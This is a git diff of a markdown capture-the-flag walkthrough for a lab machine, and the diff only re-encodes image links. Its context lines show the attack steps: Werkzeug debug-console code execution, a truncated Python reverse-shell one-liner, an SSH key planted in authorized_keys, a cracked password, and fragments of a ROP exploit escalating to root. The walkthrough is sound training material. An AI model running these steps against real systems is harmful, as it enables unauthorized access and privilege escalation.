@@ -23,15 +23,15 @@ sticker: emoji//1f64a
 ---
 
 
-![](Pasted image 20250428155349.png)
+![](Pasted%20image%2020250428155349.png)
 
 We got three articles on here, let's check them out:
 
-![](Pasted image 20250428155431.png)
+![](Pasted%20image%2020250428155431.png)
 
-![](Pasted image 20250428155440.png)
+![](Pasted%20image%2020250428155440.png)
 
-![](Pasted image 20250428155449.png)
+![](Pasted%20image%2020250428155449.png)
 
 
 Articles talk about some security incidents, nothing to helpful from them, but, if we check the URL format, we can notice this:
@@ -54,7 +54,7 @@ If we check:
 
 We can notice this:
 
-![](Pasted image 20250428160732.png)
+![](Pasted%20image%2020250428160732.png)
 
 We got some errors regarding `flask`, let's proceed to exploitation.
 
@@ -64,7 +64,7 @@ We got some errors regarding `flask`, let's proceed to exploitation.
 
 If we hover in any of the error lines, we can see a console which let's us open an python shell, we can write a simple print and check the behavior:
 
-![](Pasted image 20250428161000.png)
+![](Pasted%20image%2020250428161000.png)
 
 Nice, we can try some python payloads to check if we can get info on the system:
 
@@ -73,7 +73,7 @@ import os
 print(os.popen("whoami").read())
 ```
 
-![](Pasted image 20250428161117.png)
+![](Pasted%20image%2020250428161117.png)
 
 We are running this as `hal`, let's get a reverse shell using the following command:
 
@@ -83,7 +83,7 @@ import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec
 
 In our listener, we can see the connection:
 
-![](Pasted image 20250428161506.png)
+![](Pasted%20image%2020250428161506.png)
 
 Let's stabilize our shell and look around:
 
@@ -98,7 +98,7 @@ export BASH=bash
 ```
 
 
-![](Pasted image 20250428161606.png)
+![](Pasted%20image%2020250428161606.png)
 
 Inside of `/home/hal/.ssh`, we can find an `id_rsa` key:
 
@@ -115,7 +115,7 @@ drwxrwx--- 5 hal hal 4096 Jul 16  2021 ..
 
 Let's get it on our machine and try logging into ssh:
 
-![](Pasted image 20250428161815.png)
+![](Pasted%20image%2020250428161815.png)
 
 We need a passphrase, tried using john but there was no luck, still, we can do the following to get access to ssh:
 
@@ -138,7 +138,7 @@ echo "OUR_ID_RSA.PUB CONTENTS" >> /home/hal/.ssh/authorized_keys
 ssh hal@10.10.10.139 -i id_rsa
 ```
 
-![](Pasted image 20250428162354.png)
+![](Pasted%20image%2020250428162354.png)
 
 There we go, let's begin privilege escalation.
 
@@ -148,7 +148,7 @@ There we go, let's begin privilege escalation.
 
 Since we already got a shell as hal, we can use `linpeas` to check any PE vector:
 
-![](Pasted image 20250428162715.png)
+![](Pasted%20image%2020250428162715.png)
 
 We got a `shadow.bak` on `/var/backups`, let's check it out:
 
@@ -225,7 +225,7 @@ This is the password for `margo`:
 margo:iamgod$08
 ```
 
-![](Pasted image 20250428164428.png)
+![](Pasted%20image%2020250428164428.png)
 
 ```
 margo@ellingson:~$ cat user.txt
@@ -234,7 +234,7 @@ cbfeb02c5d13aeffcfe1fc3cd2ec37e6
 
 Let's run `linpeas` again:
 
-![](Pasted image 20250428164835.png)
+![](Pasted%20image%2020250428164835.png)
 
 We got an unknown binary named `garbage`, let's take a look:
 
@@ -673,7 +673,7 @@ log.info("Calculated libc address: " + hex(libc.address))
 shell(p, elf, libc, rop)
 ```
 
-![](Pasted image 20250428173601.png)
+![](Pasted%20image%2020250428173601.png)
 
 But the thing is we are still margo, in order to get a shell as root, we need to exploit another stuff, we need to make use of `setuid()` to set our `uid` to `0` which is the root user uid, let's change the script again:
 
@@ -758,7 +758,7 @@ shell(p, elf, libc, rop)
 
 If we use the script:
 
-![](Pasted image 20250428174703.png)
+![](Pasted%20image%2020250428174703.png)
 
 We got a root shell and can finally read the root flag to end the CTF:
 
